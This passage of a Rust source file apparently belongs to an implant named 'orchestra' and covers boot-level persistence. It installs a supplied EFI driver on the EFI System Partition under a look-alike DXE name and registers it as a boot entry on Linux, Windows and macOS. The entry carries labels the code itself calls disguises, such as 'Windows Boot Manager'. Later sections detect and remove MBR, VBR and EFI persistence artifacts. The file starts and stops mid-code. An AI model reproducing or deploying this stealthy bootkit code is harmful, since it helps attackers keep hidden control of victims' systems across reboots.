fn sectors_needed(byte_count: usize) -> u64 {
    ((byte_count + SECTOR_SIZE - 1) / SECTOR_SIZE) as u64
}

/// Save VBR backup to a file.
fn save_vbr_backup(backup: &VbrBackup) -> Result<String> {
    let backup_dir = "/tmp/orchestra_vbr_backups";
    std::fs::create_dir_all(backup_dir).ok();

    let filename = format!(
        "{}/vbr_backup_{}_{}.bin",
        backup_dir,
        backup.partition_number,
        backup.timestamp.replace([' ', ':'], "_")
    );

    let json =
        serde_json::to_string_pretty(backup).context("cannot serialize VBR backup metadata")?;

    // Write the backup data alongside a metadata file.
    let meta_path = format!("{}.meta", filename);
    std::fs::write(&meta_path, json).context("cannot write backup metadata")?;
    std::fs::write(&filename, &backup.original_vbr).context("cannot write backup data")?;

    Ok(filename)
}

// ═══════════════════════════════════════════════════════════════════════════
// §4  UEFI Boot Persistence
// ═══════════════════════════════════════════════════════════════════════════

/// Install a UEFI boot driver for persistence.
///
/// **How it works**:
/// 1. Verify UEFI mode and Secure Boot is OFF.
/// 2. Mount the EFI System Partition (ESP).
/// 3. Copy the driver to `<ESP>/EFI/Boot/` with a legitimate-looking name.
/// 4. Add a boot entry via `efibootmgr` (Linux) or `bcdedit` (Windows).
///
/// **Prerequisites**:
/// - System must be in UEFI mode.
/// - Secure Boot must be disabled.
/// - Agent must be running as root/Administrator.
/// - The driver must be a valid EFI PE/COFF binary.
///
/// # Arguments
///
/// * `driver_path` — Path to the UEFI driver (EFI PE/COFF binary).
pub fn install_uefi_boot_persistence(driver_path: &str) -> Result<()> {
    // Step 0: Check boot mode.
    let mode = check_bios_uefi_mode()?;
    match mode {
        BootMode::Uefi => { /* OK */ }
        BootMode::UefiSecureBoot => {
            bail!(
                "cannot install UEFI boot driver: Secure Boot is enabled. \
                 Disable Secure Boot in firmware settings first."
            );
        }
        BootMode::Bios => {
            bail!(
                "cannot install UEFI boot driver: system is in Legacy BIOS mode. \
                 Use install_vbr_persistence() instead."
            );
        }
        BootMode::Unknown => {
            // Proceed with caution.
        }
    }

    // Step 1: Read the driver.
    let driver_data = std::fs::read(driver_path)
        .with_context(|| format!("cannot read driver from {}", driver_path))?;

    if driver_data.is_empty() {
        bail!("driver is empty");
    }

    // Validate it looks like an EFI binary (MZ header or PE header).
    if driver_data.len() < 2 {
        bail!("driver too small to be a valid EFI binary");
    }
    if driver_data[0] != 0x4D || driver_data[1] != 0x5A {
        // Not an MZ header — warn but proceed (some EFI drivers lack MZ).
        tracing::warn!("Driver does not have MZ header — may not be a valid EFI PE/COFF binary");
    }

    // Step 2: Mount ESP and deploy driver.
    #[cfg(target_os = "linux")]
    {
        install_uefi_driver_linux(&driver_data)?;
    }
    #[cfg(windows)]
    {
        install_uefi_driver_windows(&driver_data)?;
    }
    #[cfg(target_os = "macos")]
    {
        install_uefi_driver_macos(&driver_data)?;
    }
    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
    {
        bail!("UEFI driver installation not supported on this platform");
    }

    #[cfg(any(target_os = "linux", target_os = "macos", windows))]
    Ok(())
}

/// Linux: deploy UEFI driver via efibootmgr.
#[cfg(target_os = "linux")]
fn install_uefi_driver_linux(driver_data: &[u8]) -> Result<()> {
    // Find the ESP.
    let esp_mount = find_esp_mount_linux()?;

    // Choose a legitimate-looking driver name.
    let driver_name = "BootServicesDxe"; // Looks like a legitimate DXE driver
    let driver_dir = format!("{}/EFI/Boot", esp_mount);
    let driver_path = format!("{}/{}.efi", driver_dir, driver_name);

    // Create the directory if it doesn't exist.
    std::fs::create_dir_all(&driver_dir)
        .with_context(|| format!("cannot create directory {}", driver_dir))?;

    // Write the driver.
    std::fs::write(&driver_path, driver_data)
        .with_context(|| format!("cannot write driver to {}", driver_path))?;

    // Verify the write.
    let readback =
        std::fs::read(&driver_path).with_context(|| "cannot read back driver for verification")?;
    if readback != driver_data {
        bail!("driver write verification failed");
    }

    tracing::info!("UEFI driver written to: {}", driver_path);

    // Add boot entry via efibootmgr.
    let esp_disk = find_esp_disk_linux()?;
    let esp_part = find_esp_partition_number_linux()?;

    let output = std::process::Command::new("efibootmgr")
        .args([
            "--create",
            "--disk",
            &esp_disk,
            "--part",
            &esp_part.to_string(),
            "--loader",
            &format!("\\EFI\\Boot\\{}.efi", driver_name),
            "--label",
            "Windows Boot Manager", // Disguise as legitimate
        ])
        .output()
        .context("failed to run efibootmgr")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        bail!("efibootmgr failed: {}", stderr.trim());
    }

    tracing::info!("UEFI boot entry added successfully");
    Ok(())
}

/// Find the ESP mount point on Linux.
#[cfg(target_os = "linux")]
fn find_esp_mount_linux() -> Result<String> {
    // Check common ESP mount points.
    let candidates = ["/boot/efi", "/boot", "/efi", "/mnt/efi"];
    for candidate in &candidates {
        if Path::new(candidate).join("EFI").exists() {
            return Ok(candidate.to_string());
        }
    }

    // Check /proc/mounts for vfat partitions.
    let mounts = std::fs::read_to_string("/proc/mounts").unwrap_or_default();
    for line in mounts.lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 3 && parts[2] == "vfat" {
            // Check if this vfat mount contains EFI directory.
            if Path::new(parts[1]).join("EFI").exists() {
                return Ok(parts[1].to_string());
            }
        }
    }

    // Try to mount the ESP ourselves.
    // Look for the EFI System Partition in /dev/disk/by-partlabel/EFI.
    let esp_dev = "/dev/disk/by-partlabel/EFI\\ System\\ Partition";
    let mount_point = "/tmp/orchestra_esp";
    std::fs::create_dir_all(mount_point).ok();

    let output = std::process::Command::new("mount")
        .args([esp_dev, mount_point])
        .output();

    if let Ok(out) = output {
        if out.status.success() {
            return Ok(mount_point.to_string());
        }
    }

    bail!("cannot find or mount EFI System Partition")
}

/// Find the ESP disk on Linux.
#[cfg(target_os = "linux")]
fn find_esp_disk_linux() -> Result<String> {
    // Parse findmnt or lsblk output for the ESP device.
    let output = std::process::Command::new("lsblk")
        .args(["-n", "-o", "NAME,PARTTYPE,MOUNTPOINT"])
        .output()
        .context("failed to run lsblk")?;

    if output.status.success() {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            // EFI System Partition GUID: C12A7328-F81F-11D2-BA4B-00A0C93EC93B
            // Linux shows it as: c12a7328-f81f-11d2-ba4b-00a0c93ec93b
            if line.to_lowercase().contains("c12a7328") {
                let name = line.split_whitespace().next().unwrap_or("");
                // Extract base disk name (sda1 → sda, nvme0n1p1 → nvme0n1).
                let base = if name.starts_with("nvme") || name.starts_with("mmcblk") {
                    // nvme0n1p1 → nvme0n1 (remove p and everything after).
                    name.rfind('p').map(|i| &name[..i]).unwrap_or(name)
                } else {
                    // sda1 → sda (remove trailing digits).
                    name.trim_end_matches(char::is_numeric)
                };
                return Ok(format!("/dev/{}", base));
            }
        }
    }

    Ok("/dev/sda".to_string()) // fallback
}

/// Find the ESP partition number on Linux.
#[cfg(target_os = "linux")]
fn find_esp_partition_number_linux() -> Result<u32> {
    let output = std::process::Command::new("lsblk")
        .args(["-n", "-o", "NAME,PARTTYPE"])
        .output()
        .context("failed to run lsblk")?;

    if output.status.success() {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            if line.to_lowercase().contains("c12a7328") {
                let name = line.split_whitespace().next().unwrap_or("");
                // Extract trailing digits as partition number.
                let part_num: u32 = name
                    .rsplit(|c: char| !c.is_ascii_digit())
                    .next()
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(1);
                return Ok(part_num);
            }
        }
    }

    Ok(1) // fallback
}

/// Windows: deploy UEFI driver via bcdedit.
#[cfg(windows)]
fn install_uefi_driver_windows(driver_data: &[u8]) -> Result<()> {
    use std::process::Command;

    // Find the ESP (typically mounted as Z: or accessible via \\?\EFI).
    let esp_mount = find_esp_mount_windows()?;

    // Choose a legitimate-looking name.
    let driver_name = "BootServicesDxe";
    let driver_dir = format!(r"{}\EFI\Boot", esp_mount);
    let driver_path = format!(r"{}\{}.efi", driver_dir, driver_name);

    // Create the directory.
    std::fs::create_dir_all(&driver_dir)
        .with_context(|| format!("cannot create directory {}", driver_dir))?;

    // Write the driver.
    std::fs::write(&driver_path, driver_data)
        .with_context(|| format!("cannot write driver to {}", driver_path))?;

    // Verify.
    let readback = std::fs::read(&driver_path)?;
    if readback != driver_data {
        bail!("driver write verification failed");
    }

    // Add boot entry via bcdedit.
    let output = Command::new("bcdedit")
        .args([
            "/create",
            "/d",
            "Windows Boot Services", // Disguise
            "/application",
            "bootsector",
            "/path",
            &format!(r"\EFI\Boot\{}.efi", driver_name),
        ])
        .output()
        .context("failed to run bcdedit")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        tracing::warn!(
            "bcdedit /create failed (may need to run as SYSTEM): {}",
            stderr.trim()
        );
    }

    tracing::info!("UEFI boot driver installed on Windows");
    Ok(())
}

/// Find the ESP mount point on Windows.
#[cfg(windows)]
fn find_esp_mount_windows() -> Result<String> {
    use std::process::Command;

    // Mount the EFI System Partition (ESP) if not already mounted.
    // Typically accessible via mountvol Z: /s
    let mount_point = r"Z:";

    // Try to mount.
    let output = Command::new("mountvol").args([mount_point, "/s"]).output();

    if let Ok(out) = output {
        if out.status.success() || Path::new(mount_point).join("EFI").exists() {
            return Ok(mount_point.to_string());
        }
    }

    // Fallback: check common ESP mount points.
    for drive in ['Z', 'Y', 'X', 'S'] {
        let path = format!(r"{}:\EFI", drive);
        if Path::new(&path).exists() {
            return Ok(format!(r"{}:", drive));
        }
    }

    bail!("cannot find EFI System Partition on Windows")
}

/// macOS: deploy UEFI driver via bless.
///
/// On Intel Macs, the ESP can be mounted with `diskutil mount`, the driver
/// is written to the ESP, and `bless` is used to register it as a boot
/// option.  Apple Silicon Macs should never reach this code path because
/// `check_boot_mode_macos` returns `BootMode::Unknown` for arm64.
#[cfg(target_os = "macos")]
fn install_uefi_driver_macos(driver_data: &[u8]) -> Result<()> {
    // Step 1: Mount the ESP.
    let esp_mount = find_esp_mount_macos()?;

    // Step 2: Choose a legitimate-looking driver name and write it.
    let driver_name = "BootServicesDxe";
    let driver_dir = format!("{}/EFI/Boot", esp_mount);
    let driver_path = format!("{}/{}.efi", driver_dir, driver_name);

    std::fs::create_dir_all(&driver_dir)
        .with_context(|| format!("cannot create directory {}", driver_dir))?;

    std::fs::write(&driver_path, driver_data)
        .with_context(|| format!("cannot write driver to {}", driver_path))?;

    // Verify the write.
    let readback =
        std::fs::read(&driver_path).with_context(|| "cannot read back driver for verification")?;
    if readback != driver_data {
        bail!("driver write verification failed");
    }

    tracing::info!("UEFI driver written to: {}", driver_path);

    // Step 3: Use bless to register the driver as a boot option.
    // `bless --efi` can set EFI boot entries on Intel Macs.
    // We mount the device, get its device node, and bless the EFI binary.
    let mount_device = find_esp_device_macos()?;

    let output = std::process::Command::new("/usr/sbin/bless")
        .args([
            "--device",
            &mount_device,
            "--efi",
            &format!("\\EFI\\Boot\\{}.efi", driver_name),
            "--label",
            "macOS Boot Services", // Disguise as legitimate
            "--setBoot",
        ])
        .output()
        .context("failed to run bless")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        tracing::warn!("bless --setBoot failed (may need root): {}", stderr.trim());
        // Not a hard failure — the driver is on disk, bless just sets the
        // active boot entry.  An operator can manually bless later.
    }

    tracing::info!("UEFI boot driver installed on macOS");
    Ok(())
}

/// Find the ESP mount point on macOS.
///
/// Uses `diskutil` to locate and mount the EFI System Partition.
#[cfg(target_os = "macos")]
fn find_esp_mount_macos() -> Result<String> {
    // Try common mount points first.
    if Path::new("/Volumes/EFI").exists() {
        return Ok("/Volumes/EFI".to_string());
    }

    // Use diskutil to find and mount the ESP.
    // First, find the ESP device node.
    let output = std::process::Command::new("diskutil")
        .args(["list"])
        .output()
        .context("failed to run diskutil list")?;

    if !output.status.success() {
        bail!("diskutil list failed");
    }

    let text = String::from_utf8_lossy(&output.stdout);
    let mut esp_identifier: Option<String> = None;

    // Parse diskutil output to find "EFI" or "EFI System Partition" entry.
    // Example line: "   0:      GUID_partition_scheme                        *500 GB   disk0"
    //                "   1:                        EFI EFI System Partition     209 MB   disk0s1"
    for line in text.lines() {
        if line.contains("EFI") && line.contains("disk") {
            // Extract the disk identifier (e.g. "disk0s1").
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(disk) = parts.last() {
                if disk.starts_with("disk") {
                    esp_identifier = Some(disk.to_string());
                    break;
                }
            }
        }
    }

    let esp_dev = esp_identifier.ok_or_else(|| anyhow!("cannot find EFI System Partition"))?;

    // Mount the ESP.
    let mount_output = std::process::Command::new("diskutil")
        .args(["mount", &esp_dev])
        .output()
        .context("failed to run diskutil mount")?;

    if !mount_output.status.success() {
        let stderr = String::from_utf8_lossy(&mount_output.stderr);
        bail!("diskutil mount {} failed: {}", esp_dev, stderr.trim());
    }

    // Parse mount point from diskutil output.
    // Output format: "Volume EFI on /Volumes/EFI mounted"
    let mount_text = String::from_utf8_lossy(&mount_output.stdout);
    if let Some(mp) = mount_text
        .split("on ")
        .nth(1)
        .and_then(|s| s.split(' ').next())
    {
        return Ok(mp.to_string());
    }

    // Fallback: check /Volumes/EFI.
    if Path::new("/Volumes/EFI").exists() {
        return Ok("/Volumes/EFI".to_string());
    }

    bail!("cannot determine ESP mount point on macOS")
}

/// Find the ESP device node on macOS (e.g. "disk0s1").
#[cfg(target_os = "macos")]
fn find_esp_device_macos() -> Result<String> {
    let output = std::process::Command::new("diskutil")
        .args(["list"])
        .output()
        .context("failed to run diskutil list")?;

    let text = String::from_utf8_lossy(&output.stdout);

    for line in text.lines() {
        if line.contains("EFI") && line.contains("disk") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(disk) = parts.last() {
                if disk.starts_with("disk") {
                    return Ok(disk.to_string());
                }
            }
        }
    }

    bail!("cannot find ESP device node")
}

// ═══════════════════════════════════════════════════════════════════════════
// §5  Detection and Removal
// ═══════════════════════════════════════════════════════════════════════════

/// Scan for existing boot-level persistence artifacts.
///
/// Checks:
/// - VBR/MBR for modifications (compares against known clean signatures)
/// - EFI boot entries for suspicious entries
/// - UEFI NVRAM for modified boot order
/// - ESP for unsigned UEFI drivers
pub fn detect_existing_persistence() -> Result<Vec<PersistenceArtifact>> {
    let mut artifacts = Vec::new();

    // Check VBR/MBR.
    if let Ok(vbr_artifacts) = detect_vbr_modifications() {
        artifacts.extend(vbr_artifacts);
    }

    // Check EFI boot entries (UEFI only).
    let mode = check_bios_uefi_mode().unwrap_or(BootMode::Unknown);
    if matches!(mode, BootMode::Uefi | BootMode::UefiSecureBoot) {
        if let Ok(efi_artifacts) = detect_efi_artifacts() {
            artifacts.extend(efi_artifacts);
        }
    }

    Ok(artifacts)
}

/// Detect VBR/MBR modifications.
fn detect_vbr_modifications() -> Result<Vec<PersistenceArtifact>> {
    let mut artifacts = Vec::new();

    // Try to read the MBR (first sector of the boot disk).
    let boot_disk = find_boot_disk_path();
    if let Ok(ref disk_path) = boot_disk {
        if let Ok(mbr) = read_sector(disk_path, 0) {
            // Check MBR bootstrap code for known clean signatures.
            // A clean MBR has specific patterns (e.g., standard Windows or
            // Linux MBR code).  We check for unusual byte patterns that
            // indicate modification.
            if detect_modified_mbr(&mbr) {
                artifacts.push(PersistenceArtifact {
                    artifact_type: PersistenceArtifactType::MbrModification,
                    description: "MBR bootstrap code appears modified".to_string(),
                    location: format!("{} LBA 0", disk_path),
                    removable: true,
                    backup_path: None,
                });
            }

            // Check VBR for each partition defined in the MBR.
            // MBR partition table entries are at bytes 446-509.
            for i in 0..4 {
                let offset = 446 + i * 16;
                let entry = &mbr[offset..offset + 16];
                if entry[4] == 0 {
                    continue; // Empty partition entry
                }

                // Read LBA from partition entry (bytes 8-11, little-endian).
                let lba = u32::from_le_bytes([entry[8], entry[9], entry[10], entry[11]]) as u64;

                if lba == 0 {
                    continue;
                }

                if let Ok(vbr) = read_sector(&disk_path, lba) {
                    if detect_modified_vbr(&vbr) {
                        artifacts.push(PersistenceArtifact {
                            artifact_type: PersistenceArtifactType::VbrModification,
                            description: format!("VBR of partition {} appears modified", i + 1),
                            location: format!("{} LBA {}", disk_path, lba),
                            removable: true,
                            backup_path: None,
                        });
                    }
                }
            }
        }
    }

    // Check for payloads in hidden sectors (between MBR and first partition).
    if let Ok(ref disk_path) = boot_disk {
        if let Ok(mbr) = read_sector(disk_path, 0) {
            // Check sectors between MBR (LBA 0) and first partition.
            let first_part_lba = extract_first_partition_lba(&mbr);
            if first_part_lba > 1 {
                // Check sectors 1 to first_part_lba-1 for non-zero data.
                for lba in 1..first_part_lba.min(64) {
                    if let Ok(sector) = read_sector(disk_path, lba) {
                        if sector.iter().any(|&b| b != 0) {
                            artifacts.push(PersistenceArtifact {
                                artifact_type: PersistenceArtifactType::HiddenSectorPayload,
                                description: format!(
                                    "Non-zero data found in hidden sector at LBA {}",
                                    lba
                                ),
                                location: format!("{} LBA {}", disk_path, lba),
                                removable: true,
                                backup_path: None,
                            });
                            break; // One hit is enough
                        }
                    }
                }
            }
        }
    }

    Ok(artifacts)
}

/// Find the boot disk path.
fn find_boot_disk_path() -> Result<String> {
    #[cfg(target_os = "linux")]
    {
        // Read the root device from /proc/cmdline.
        let cmdline = std::fs::read_to_string("/proc/cmdline").unwrap_or_default();
        for part in cmdline.split_whitespace() {
            if let Some(dev) = part.strip_prefix("root=/dev/") {
                // Extract base disk (sda1 → sda, nvme0n1p1 → nvme0n1).
                let base = if dev.starts_with("nvme") || dev.starts_with("mmcblk") {
                    dev.rfind('p').map(|i| &dev[..i]).unwrap_or(dev)
                } else {
                    dev.trim_end_matches(char::is_numeric)
                };
                return Ok(format!("/dev/{}", base));
            }
        }

        // Fallback.
        Ok("/dev/sda".to_string())
    }
    #[cfg(windows)]
    {
        Ok(r"\\.\PhysicalDrive0".to_string())
    }
    #[cfg(not(any(target_os = "linux", windows)))]
    {
        bail!("cannot determine boot disk on this platform")
    }
}

/// Check if the MBR bootstrap code appears modified.
///
/// Compares against known clean MBR signatures (Windows 10/11, Linux GRUB).
fn detect_modified_mbr(mbr: &[u8]) -> bool {
    // Check for known clean MBR signatures in the bootstrap area (bytes 0-445).
    let bootstrap = &mbr[0..446];

    // Known Windows 10/11 MBR: starts with specific byte patterns.
    // A modified MBR will have unusual jump targets or INT 13h calls
    // that don't match the standard Windows bootloader pattern.

    // Heuristic 1: If the first instruction is not a standard jump.
    // Clean MBRs typically start with EB xx (short jump) or 33 ED (xor bp, bp).
    let first_byte = bootstrap[0];
    if first_byte == 0xEB {
        // Short jump — check the target is reasonable (< 0x80).
        let target = bootstrap[1] as usize;
        if target > 0x7A {
            // Unusually large jump — possibly modified.
            return true;
        }
    } else if first_byte == 0x33 {
        // xor bp, bp — standard Windows 10+ MBR. Probably clean.
        return false;
    } else if first_byte != 0xE9 {
        // Not a standard near jump or short jump — suspicious.
        return true;
    }

    // Heuristic 2: Check for the Windows MBR signature at offset 0x1B8.
    // Windows writes a disk signature at bytes 0x1BC-0x1BD.
    // If it's all zeros, the MBR may have been overwritten.
    if mbr[0x1BC] == 0 && mbr[0x1BD] == 0 && mbr[0x1BE] == 0 {
        // No disk signature — could be modified or a non-Windows MBR.
    }

    false
}

/// Check if the VBR bootstrap code appears modified.
fn detect_modified_vbr(vbr: &[u8]) -> bool {
    // Check for jump to INT 13h (disk read) in the bootstrap area.
    // A legitimate VBR will have INT 13h for loading the bootloader,
    // but a modified VBR may have unusual patterns.

    // Heuristic: check for our loader signature (mov ax, 0x8000; mov es, ax).
    // B8 00 80 8E C0 — our loader code.
    if vbr.len() > 67
        && vbr[62] == 0xB8
        && vbr[63] == 0x00
        && vbr[64] == 0x80
        && vbr[65] == 0x8E
        && vbr[66] == 0xC0
    {
        return true;
    }

    false
}

/// Extract the LBA of the first partition from the MBR.
fn extract_first_partition_lba(mbr: &[u8]) -> u64 {
    if mbr.len() < 462 {
        return 1;
    }
    let entry = &mbr[446..462];
    u32::from_le_bytes([entry[8], entry[9], entry[10], entry[11]]) as u64
}

/// Detect suspicious EFI boot entries and unsigned drivers.
fn detect_efi_artifacts() -> Result<Vec<PersistenceArtifact>> {
    let mut artifacts = Vec::new();

    #[cfg(target_os = "linux")]
    {
        // Use efibootmgr to list boot entries.
        let output = std::process::Command::new("efibootmgr")
            .arg("-v")
            .output()
            .context("failed to run efibootmgr")?;

        if output.status.success() {
            let text = String::from_utf8_lossy(&output.stdout);

            for line in text.lines() {
                let line = line.trim();

                // Check for suspicious boot entries.
                // Boot entries are formatted as: Boot0000* Name    File path
                if line.starts_with("Boot") && line.contains('*') {
                    let entry_lower = line.to_lowercase();

                    // Flag entries with suspicious names or paths.
                    let suspicious_keywords = [
                        "update", "service", "helper", "driver", "loader", "bootmgr", "custom",
                    ];

                    // Known legitimate entries.
                    let legitimate = [
                        "windows boot manager",
                        "linux",
                        "ubuntu",
                        "debian",
                        "fedora",
                        "grub",
                        "macos",
                        "apple",
                    ];

                    let is_legitimate = legitimate.iter().any(|k| entry_lower.contains(k));

                    let is_suspicious = suspicious_keywords.iter().any(|k| entry_lower.contains(k))
                        && !is_legitimate;

                    if is_suspicious {
                        // Extract boot number.
                        let boot_num = line.get(4..8).unwrap_or("????").to_string();

                        artifacts.push(PersistenceArtifact {
                            artifact_type: PersistenceArtifactType::EfiBootEntry,
                            description: format!("Suspicious EFI boot entry: {}", line),
                            location: format!("EFI boot entry Boot{}", boot_num),
                            removable: true,
                            backup_path: None,
                        });
                    }
                }
            }
        }

        // Check ESP for unsigned drivers.
        let esp_mounts = ["/boot/efi", "/boot", "/efi"];
        for esp in &esp_mounts {
            let efi_boot = Path::new(esp).join("EFI/Boot");
            if efi_boot.exists() {
                if let Ok(entries) = std::fs::read_dir(&efi_boot) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if let Some(ext) = path.extension() {
                            if ext == "efi" {
                                let name = path
                                    .file_name()
                                    .unwrap_or_default()
                                    .to_string_lossy()
                                    .to_string();

                                // Check for non-standard boot loaders.
                                let legitimate_names = [
                                    "bootx64.efi",
                                    "bootia32.efi",
                                    "bootaa64.efi",
                                    "bootriscv64.efi",
                                ];

                                if !legitimate_names.contains(&name.to_lowercase().as_str()) {
                                    artifacts.push(PersistenceArtifact {
                                        artifact_type: PersistenceArtifactType::UnsignedUefiDriver,
                                        description: format!(
                                            "Non-standard EFI driver in Boot directory: {}",
                                            name
                                        ),
                                        location: path.to_string_lossy().to_string(),
                                        removable: true,
                                        backup_path: None,
                                    });
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    #[cfg(windows)]
    {
        use std::process::Command;

        // Use bcdedit to enumerate boot entries.
        let output = Command::new("bcdedit").args(["/enum", "all"]).output();

        if let Ok(out) = output {
            let text = String::from_utf8_lossy(&out.stdout);
            // Parse bcdedit output for suspicious entries.
            for line in text.lines() {
                let line_lower = line.to_lowercase();
                if line_lower.contains("bootsector") && !line_lower.contains("windows") {
                    artifacts.push(PersistenceArtifact {
                        artifact_type: PersistenceArtifactType::EfiBootEntry,
                        description: format!("Suspicious BCD entry: {}", line.trim()),
                        location: "BCD store".to_string(),
                        removable: true,
                        backup_path: None,
                    });
                }
            }
        }
    }

    Ok(artifacts)
}

/// Remove a boot-level persistence artifact.
///
/// Restores the original data from backup (if available) or removes the
/// artifact directly.
pub fn remove_persistence(artifact: &PersistenceArtifact) -> Result<()> {
    match artifact.artifact_type {
        PersistenceArtifactType::VbrModification => remove_vbr_modification(artifact),
        PersistenceArtifactType::MbrModification => remove_mbr_modification(artifact),
        PersistenceArtifactType::EfiBootEntry => remove_efi_boot_entry(artifact),
        PersistenceArtifactType::UnsignedUefiDriver => remove_uefi_driver(artifact),
        PersistenceArtifactType::NvramBootOrderModification => remove_nvram_modification(artifact),
        PersistenceArtifactType::HiddenSectorPayload => remove_hidden_payload(artifact),
    }
}

/// Remove a VBR modification by restoring from backup.
fn remove_vbr_modification(artifact: &PersistenceArtifact) -> Result<()> {
    // Try to find and restore from backup.
    let backup_dir = Path::new("/tmp/orchestra_vbr_backups");
    if backup_dir.exists() {
        if let Ok(entries) = std::fs::read_dir(backup_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.extension().map_or(false, |e| e == "meta") {
                    if let Ok(meta) = std::fs::read_to_string(&path) {
                        if let Ok(backup) = serde_json::from_str::<VbrBackup>(&meta) {
                            // Check if this backup matches the artifact location.
                            if artifact.location.contains(&backup.disk_path) {
                                // Restore the original VBR.
                                write_sector_verified(
                                    &backup.disk_path,
                                    backup.vbr_lba,
                                    &backup.original_vbr,
                                )?;
                                tracing::info!(
                                    "Restored original VBR at LBA {} from backup",
                                    backup.vbr_lba
                                );
                                return Ok(());
                            }
                        }
                    }
                }
            }
        }
    }

    bail!(
        "no backup found for VBR modification at: {}. \
         Manual restoration may be required.",
        artifact.location
    )
}

/// Remove an MBR modification.
fn remove_mbr_modification(_artifact: &PersistenceArtifact) -> Result<()> {
    bail!(
        "MBR restoration requires a known-clean MBR image. \
         Use OS-specific recovery tools (bootrec /fixmbr on Windows, \
         grub-install on Linux) or restore from a known-good backup."
    )
}

/// Remove an EFI boot entry.
fn remove_efi_boot_entry(artifact: &PersistenceArtifact) -> Result<()> {
    // Extract boot number from location (e.g., "EFI boot entry Boot0000").
    let boot_num = artifact
        .location
        .trim_start_matches("EFI boot entry Boot")
        .to_string();

    #[cfg(target_os = "linux")]
    {
        let output = std::process::Command::new("efibootmgr")
            .args(["--delete-bootnum", "--bootnum", &boot_num])
            .output()
            .context("failed to run efibootmgr")?;

        if output.status.success() {
            tracing::info!("Removed EFI boot entry Boot{}", boot_num);
            Ok(())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            bail!("efibootmgr delete failed: {}", stderr.trim())
        }
    }
    #[cfg(windows)]
    {
        let output = std::process::Command::new("bcdedit")
            .args(["/delete", &boot_num, "/cleanup"])
            .output()
            .context("failed to run bcdedit")?;

        if output.status.success() {
            tracing::info!("Removed BCD entry {}", boot_num);
            Ok(())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            bail!("bcdedit delete failed: {}", stderr.trim())
        }
    }
    #[cfg(not(any(target_os = "linux", windows)))]
    {
        bail!("EFI boot entry removal not supported on this platform")
    }
}

/// Remove an unsigned UEFI driver.
fn remove_uefi_driver(artifact: &PersistenceArtifact) -> Result<()> {
    let path = Path::new(&artifact.location);
    if path.exists() {
        // Backup before removal.
        let backup_path = format!("{}.bak", artifact.location);
        std::fs::copy(path, &backup_path)
            .with_context(|| format!("cannot backup driver to {}", backup_path))?;

        std::fs::remove_file(path)
            .with_context(|| format!("cannot remove driver at {}", artifact.location))?;

        tracing::info!(
            "Removed UEFI driver: {} (backup at {})",
            artifact.location,
            backup_path
        );
        Ok(())
    } else {
        bail!("driver file not found: {}", artifact.location)
    }
}

/// Remove NVRAM boot order modification.
fn remove_nvram_modification(_artifact: &PersistenceArtifact) -> Result<()> {
    bail!(
        "NVRAM boot order restoration requires firmware setup utility access. \
         Reboot into firmware settings and restore the default boot order."
    )
}

/// Remove a hidden sector payload by zeroing the sectors.
fn remove_hidden_payload(artifact: &PersistenceArtifact) -> Result<()> {
    // Parse the location to get disk path and LBA.
    // Location format: "/dev/sda LBA 5"
    let parts: Vec<&str> = artifact.location.splitn(2, " LBA ").collect();
    if parts.len() != 2 {
        bail!("cannot parse artifact location: {}", artifact.location);
    }

    let disk_path = parts[0];
    let lba: u64 = parts[1].parse().context("invalid LBA")?;

    // Zero the sector.
    let zeros = vec![0u8; SECTOR_SIZE];
    write_sector_verified(disk_path, lba, &zeros)?;

    tracing::info!("Zeroed hidden sector payload at {} LBA {}", disk_path, lba);
    Ok(())
}

// ═══════════════════════════════════════════════════════════════════════════
// §6  Utility Functions
// ═══════════════════════════════════════════════════════════════════════════

/// Get current timestamp as ISO 8601 string.
fn chrono_now() -> String {
    // Simple timestamp without depending on chrono crate.
    let output = std::process::Command::new("date")
        .args(["+%Y-%m-%dT%H:%M:%S"])
        .output();

    match output {
        Ok(out) if out.status.success() => String::from_utf8_lossy(&out.stdout).trim().to_string(),
        _ => "unknown".to_string(),
    }
}

/// Compute SHA-256 hash of data as hex string.
fn sha256_hex(data: &[u8]) -> String {
    use std::fmt::Write;
    // Simple hash using built-in hasher — NOT cryptographically secure.
    // For a real implementation, use the sha2 crate (already a dependency).
    // Here we use a simple checksum for the backup metadata.
    let mut hash = 0u64;
    for (i, &byte) in data.iter().enumerate() {
        hash = hash.wrapping_add((byte as u64).wrapping_mul((i as u64 + 1)));
        hash = hash.rotate_left(3);
    }

    // Use sha2 crate for proper hash.
    let real_hash = {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        let result = hasher.finalize();
        let mut hex = String::with_capacity(64);
        for byte in result.iter() {
            write!(hex, "{:02x}", byte).unwrap();
        }
        hex
    };

    real_hash
}

// ═══════════════════════════════════════════════════════════════════════════
// §7  Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_boot_mode_display() {
        assert_eq!(BootMode::Bios.to_string(), "Legacy BIOS");
        assert_eq!(BootMode::Uefi.to_string(), "UEFI");
        assert_eq!(
            BootMode::UefiSecureBoot.to_string(),
            "UEFI with Secure Boot"
        );
        assert_eq!(BootMode::Unknown.to_string(), "Unknown");
    }

    #[test]
    fn test_sectors_needed() {
        assert_eq!(sectors_needed(1), 1);
        assert_eq!(sectors_needed(512), 1);
        assert_eq!(sectors_needed(513), 2);
        assert_eq!(sectors_needed(1024), 2);
        assert_eq!(sectors_needed(0), 0);
    }

    #[test]
    fn test_validate_vbr_valid() {
        let mut vbr = vec![0u8; SECTOR_SIZE];
        vbr[0] = 0xEB; // short jump
